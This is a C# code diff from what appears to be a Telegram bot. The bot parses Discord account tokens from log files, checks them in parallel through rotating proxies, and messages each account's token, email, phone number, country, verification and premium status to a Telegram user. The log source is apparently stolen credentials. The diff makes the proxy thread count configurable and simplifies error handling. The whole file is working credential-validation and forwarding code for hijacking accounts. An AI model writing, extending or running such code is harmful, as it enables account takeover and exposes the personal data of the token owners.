@@ -32,23 +32,25 @@ namespace Bot.Telegram.Commands.User.Services {
 					var tokens = await parser.FromLogs(path).ToListAsync();
 					
 					logger.LogInformation("[Discord] Taking proxy");
-					var proxy_list = await proxies.TakeAsync(10).ToListAsync(); // TODO change with MaxThreads
+					var proxy_list = await proxies.TakeAsync(int.Parse(config["Multithreading:Proxy:MaxThreads"]!)).ToListAsync();
 
 					logger.LogInformation("[Discord] Start processing");
 					tokens.WithThreads(
+						int.Parse(config["Multithreading:Proxy:MaxThreads"]!),
 						async (account, index) => {
-							if (!await checker.CheckAsync(account, proxy_list[index])) {
-								return;
+							await using var proxy = proxy_list[index];
+
+							using (var http = (HttpClient)proxy) {
+								return await checker.CheckAsync(account, http) && await checker.DetailsAsync(account, http);
 							}
-
-							await checker.DetailsAsync(account, proxy_list[index]);
-
+						},
+						async (account, _) => {
 							var text = $$"""
 										 {{account.Username}}
 
 										 Token: `{{account.Token}}`
-										 Email: {{(string.IsNullOrEmpty(account.Email) ? "None" : $"`{account.Email}`")}}
-										 Phone: {{(string.IsNullOrEmpty(account.Phone) ? "None" : $"`{account.Phone}`")}}
+										 Email: {{(string.IsNullOrEmpty(account.Email) ? "None" : account.Email)}}
+										 Phone: {{(string.IsNullOrEmpty(account.Phone) ? "None" : account.Phone)}}
 										 Country: {{(string.IsNullOrEmpty(account.CountryCode) ? "Unknown" : account.CountryCode)}}
 										 Verified: {{(account.Verified ? "True" : "False")}}
 										 Premium: {{account.PremiumType.ToString()}}
@@ -62,28 +64,17 @@ namespace Bot.Telegram.Commands.User.Services {
 							logger.LogDebug("[Discord] Try to send: \n{account}\n{content}", JsonConvert.SerializeObject(account, Formatting.Indented), text);
 #endif
                             
-							MessageEntity[] entities = client.MarkdownToEntities(ref text);
+							var entities = client.MarkdownToEntities(ref text);
 							
-							try {
-								await client.SendMessageAsync(
-									user,
-									text,
-									media: account.Avatar is not null ? new InputMediaPhotoExternal {
-										url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.Avatar}.webp"
-									} : null,
-									entities: entities
-								);
-							} catch {
-								await client.SendMessageAsync(
-									user,
-									text,
-									media: new InputMediaPhotoExternal {
-										url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.Avatar}.webp"
-									}
-								);
-							}
-						},
-						10 // TODO change with MaxThreads
+							await client.SendMessageAsync(
+								user,
+								text,
+								media: account.Avatar is not null ? new InputMediaPhotoExternal {
+									url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.Avatar}.webp"
+								} : null,
+								entities: entities
+							);
+						}
 					);
 				}
 			);
